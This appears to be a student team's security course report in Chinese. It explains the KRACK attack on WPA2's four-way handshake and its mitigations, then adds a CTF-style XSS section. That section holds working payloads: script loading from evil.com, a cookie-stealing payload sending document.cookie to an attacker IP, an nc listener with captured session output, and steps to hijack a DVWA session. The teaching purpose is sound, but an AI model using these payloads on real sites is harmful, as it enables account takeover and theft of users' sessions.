# Team 7 - Project 5 - KRACK

## 背景介紹

KRACK（Key Reinstallation AttaCKs）：金鑰重新安裝攻擊
- 是一種針對保護 Wi-Fi 連接的 WPA 協定的攻擊手段
- 不需要依靠密碼猜測的 WPA2 協定攻擊手段

WPA（Wi-Fi Protected Access）： Wi-Fi存取保護
* 一種保護無線網路（Wi-Fi）存取安全的技術標準
* WPA2 使用四向交握 ( four-way handshake) 確保連線裝置（STA）和 AP（access point, 如市面常見的路由器）之間的安全性。

## KRACK 攻擊手法

### 四向交握 ( 4-WAY HANDSHAKE )

#### 步驟
1. AP 傳送一組初始化向量（ANonce）給客戶端裝置（STA）。
2. STA 接到 ANonce，產生一組PTK（Pairwise Transient Key）和另一個初始化向量（SNonce）發給 AP，並且使用了名為 MIC（Message Integrity Code）的檢驗碼。
3. AP收到 SNonce 後，也會導出一組PTK，並發送密鑰 GTK給STA。
4. STA 在安裝本身 PTK 和 GTK 之後回復訊息（Ack）給AP。

#### 解析
四向交握的第四次握手，可能因網路不穩等原因，導致 AP 端並沒有收到 ok ，就像 Bob 沒有回 Alice 一樣，AP 端只好再傳一次 GTK 給 STA 端。

此時如果 STA 端其實有安裝成功，但 AP 端沒收到 ok 進而再傳一次時，就會迫使 STA 端重新安裝相同密鑰。

因為協議中沒有限制金鑰安裝的次數，所以 KRACKs 攻擊就是讓 AP 重複執行第三次握手，多次會導致協議中使用的隨機數和封包計數器歸零。

攻擊者就是在第三次的交握中，欺騙存取點向裝置重複傳送加密金鑰，但裝置重複安裝相同的金鑰時，nonce 就會被重設。由於 nonce 可被重用，攻擊者便可破解加密。

#### 問題
KRACK 並非直接解開 WPA2 加密強制通訊，而是透過基地臺重送訊號讓接收者再次使用那些應該用完即丟的加密金鑰，進而將封包序號計數器歸零。
隨機數和封包計數器就是確保我們密鑰的產生是不可被猜測的，一旦強迫歸零，攻擊者就可以得知密鑰，進一步大量重播解碼封包，或是插入封包來竄改通訊內容。

唯一受限點：攻擊者必須進入基地台訊號範圍，無法用網路遠端攻擊。

#### 四次交握流程圖
![](https://i.imgur.com/wWmzPJm.jpg)

比利時資安研究員 Mathy Vanhoef 展示的驗證過程影片中，示範了一種情況。

在 KRACKs 攻擊過程透過網路封包分析軟體 WireShark，並偽造與真實 AP 相同 SSID 無線網路名稱與 MAC Address 的熱點，在終端裝置要與真實 AP 完成認證的時候，透過中間人攻擊與 KRACKs 的攻擊方法，迫使終端設備主動連接偽冒的 SSID ，竊取終端裝置連至交友網站時，輸入的帳號與密碼。

[Mathy Vanhoef 驗證 KRACK 過程](https://www.youtube.com/watch?v=Oh4WURZoR98)

## KRACK应对
### 预估受害范围
在10月16日之前尚未修复此漏洞的装置设备：
* 作业系统
  * Microsoft
  * masOS
  * 使用wpa_supplicant 2.4、2.5版本的Linux系统
* 移动装置
  * Android 6.0及之后的版本
  * Android Wear 2.0
* 无线AP
  * 不论何种标准（WPA/WPA2）和任何加密方式（AES/TKIP）都会被破解。

### 应对方法
* 使用者应当尽量浏览使用HTTPS的加密网站，确保使用者浏览网页时的安全性。
* 设备未修补此漏洞前，尽量避免传送个人相关的机密资料。
* 使用者连网设备的作业系统，包括电脑、手机作业系统的安全性更新，应尽速更新至最新版本。
*  Wi-Fi AP 的设置尽快更新到最新版本。
* 尽量减少使用公共Wi-Fi (如果使用者有行动网路的话)。
* 暂时关闭802.11r（fast roaming）来减少被攻击的机率。

## 模擬題目

## CTF中关于XSS跨站的小结
> XSS即跨站脚本，发生在目标网站上目标用户的浏览器层面，当用户浏览器渲染整个HTML文档过程中出现了不被预期的脚本并执行时，XSS就会发生。

任何的安全问题都有“输入”的概念，**很多时候输入内容长度是有限制的，真正的XSS攻击弹窗毫无意义，所以攻击代码可能会比较长**，一般会注入类似下面的代码来引用第三方域上的脚本资源：
&nbsp;&nbsp;&nbsp;&nbsp;`<script src="http://evil.com/xss.js"></script>`
而有的时候，并不按照浏览器允许的策略执行（**同源策略**），那就是真正意义上的跨站了，**突破的是浏览器同源策略**。
例如：
```
<script>
    eval(location.hash.substr(1));
</script>
```
将以上代码保存为一个网页文件然后用chrome打开将会什么都不显示，如果这是目标网站，要执行我们自己的脚本来触发XSS攻击，需要把`alert(1)`这样的脚本改成真正具有杀伤力的第三方的脚本资源，例如：
`http://www.foo.com/xssme.html#document.write("<script/scr=//www.eval.com/alert.js></script>")`
诱骗用户点击后，目标浏览器就会开始执行我们需要的恶意脚本。

**通对于XSS，可以小结为：想进一切办法将你的脚本内容在目标网站中目标用户的浏览器上解析执行即可。**

在XSS攻击成功后，能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为`XSS Payload`。`XSS Payload`实际上就是JavaScript脚本(还可以是Flash 或其他富客户端的脚本),所以任何JavaScript脚本能实现的功能，`XSS Payload`都能做到。一个最常见的 `XSS Payload`,就是通过读取浏览器的Cookie对象，从而发起Cookie劫持攻击。

同样的还有很多攻击方式，再如查看浏览器历史记录，访问劫持等等。

### 盗用cookie

Cookie一般加密保存了用户的登陆凭证。Cookie 如果丢失了，往往意味着用户的登陆凭证丢失。换句话说，攻击者可以不通过密码，而直接进入用户的账户。

Cookie盗取Payload：
```
<script>
var img=document.createElement("img");img.src="http://192.168.118.138:1234/a?"+escape(document.cookie);
</script>
```
以DVWA为例，DOM型XSS:
`http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert(v0w)</script>`
在kali上nc监听端口1234:
`nc -nvlp 1234`
构造Cookie劫持的`XSS Payload`:
```
http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>var img=document.createElement("img");img.src="http://192.168.118.138:1234/a?"+escape(document.cookie);</script>
```

kali上接收到数据包:
```
root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.118.138] from (UNKNOWN) [192.168.118.1] 49597
GET /a?security%3Dlow%3B%20PHPSESSID%3Do58bsvrlfbval38fs1l3gubr16 HTTP/1.1
Host: 192.168.118.138:1234
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Evar%20img=document.createElement(%22img%22);img.src=%22http://192.168.118.138:1234/a?%22+escape(document.cookie);%3C/script%3E
Connection: close
```
其中，参数a后面的就是Cookie.
`security=low; PHPSESSID=o58bsvrlfbval38fs1l3gubr16
`
有了这个Cookie，我们可以在不知道密码的情况下，登陆该用户的账户：
1. 打开另一个浏览器，并没有登陆
2. 从抓到的包，可以看出链接地址，直接进入`http://localhost/dvwa/vulnerabilities/xss_d/`,发现进不去，需要登陆。
3. set-Cookie：`security=low; PHPSESSID=o58bsvrlfbval38fs1l3gubr16`
4. 再次访问链接`http://localhost/dvwa/vulnerabilities/xss_d/`,发现可以进入了，账户身份正是盗取的用户身份。

### 防护手段
* HttpOnly
* Cookie与IP地址绑定

### XSS构造GET&POST请求

对网站的浏览和操作，大部分都可以通过GET请求和POST请求来完成，因此可以通过js构造XSS Payload以完成一系列操作。

如可以通过一个url可以删除文件：
`http://www.example.com/do/?m=delete&id=123`

攻击者可以通过构造XSS Payload,发起这个请求：
```
var img = docunment.createElement("img");
img.src = "http://www.example.com/do/?m=delete&id=123";
document.body.appendChild(img);
```
同样的道理，甚至可以利用`XSS Payload` 读取用户邮箱的邮件。

### XSS类型
* **反射型XSS**

&nbsp;&nbsp;&nbsp;&nbsp;发送请求时，XSS代码出现在URL中，作为输入提交到服务端，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行。这个过程就像一次反射，所以称作为反射型XSS.
* **储存型XSS**

&nbsp;&nbsp;&nbsp;&nbsp;储存型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。

* **DOM XSS**


&nbsp;&nbsp;&nbsp;&nbsp;和前两个的区别在于，DOM XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。

## 防範撈取握手封包並使用密碼字典攻擊
> 目前大部分的WIFI加密主流仍然是WPA2-PSK，儘管過去兩年各大廠商已盡可能修補了KRACK的漏洞，仍然無法避免握手封包的監聽攻擊，透過監聽指定WIFI的封包來取得握手封包，並使用密碼字典攻擊，習慣使用弱密碼的用戶無時無刻處於危險之中。  

> 最直接也最有效的解決辦法是使用WISP設備進行WIFI管理，除了KRACK的相關漏洞，也能防範aircrack及假熱點的攻擊。

## Contribution
[clickme](https://hackmd.io/EkD3WmKyQgexSx-1F85Mkg)
